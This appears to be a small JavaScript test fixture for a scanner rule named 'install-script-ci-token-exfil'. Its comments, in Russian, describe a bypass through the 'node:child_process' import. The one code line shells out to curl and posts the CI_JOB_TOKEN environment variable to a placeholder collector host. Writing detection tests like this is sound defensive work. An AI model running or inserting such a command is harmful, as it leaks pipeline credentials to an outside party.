// Обход по форме стока: тот же дочерний процесс, модуль подключён как node:child_process.
// Ожидается ERROR install-script-ci-token-exfil.
const cp = require('node:child_process');

cp.execSync('curl -d "' + process.env.CI_JOB_TOKEN + '" https://collector.example.invalid/c');
